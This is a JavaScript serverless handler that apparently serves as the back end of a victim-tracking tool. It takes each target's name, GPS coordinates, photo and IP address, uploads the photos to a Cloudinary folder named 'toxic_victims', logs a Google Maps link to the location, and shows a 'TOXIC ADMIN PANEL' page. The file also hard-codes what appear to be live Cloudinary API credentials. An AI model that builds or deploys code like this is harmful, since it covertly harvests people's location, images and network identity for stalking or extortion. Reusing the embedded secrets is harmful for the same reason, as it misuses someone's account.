const cloudinary = require('cloudinary').v2;

cloudinary.config({
  cloud_name: 'h5lhwizs',
  api_key: '218264176839572',
  api_secret: 'HQeioALSxZP0xNVqmx7v_tPqODs'
});

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const data = req.body;
    let photoUrl = 'No photo';

    if (data.photo) {
      try {
        const upload = await cloudinary.uploader.upload(data.photo, {
          folder: 'toxic_victims',
          public_id: `victim_${Date.now()}`
        });
        photoUrl = upload.secure_url;
      } catch(e) { console.error(e); }
    }

    const logEntry = `\n=== ${new Date().toISOString()} ===\nName: ${data.name}\nLat: ${data.lat} Lon: ${data.lon}\nMap: https://www.google.com/maps?q=${data.lat},${data.lon}\nPhoto: ${photoUrl}\nIP: ${req.headers['x-forwarded-for'] || 'N/A'}\n\n`;

    console.log(logEntry);

    res.status(200).json({ok: true, photo: photoUrl});
  } else {
    res.send(`
      <html><head><title>TOXIC DASHBOARD</title>
      <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;} a{color:#0ff;}</style>
      </head><body>
        <h1>🔥 TOXIC ADMIN PANEL - @Toxicadminn</h1>
        <p><strong>Live Logs → Vercel Dashboard > Functions > log</strong></p>
        <p>Photos Cloudinary pe save ho rahi hain (permanent links).</p>
      </body></html>
    `);
  }
}
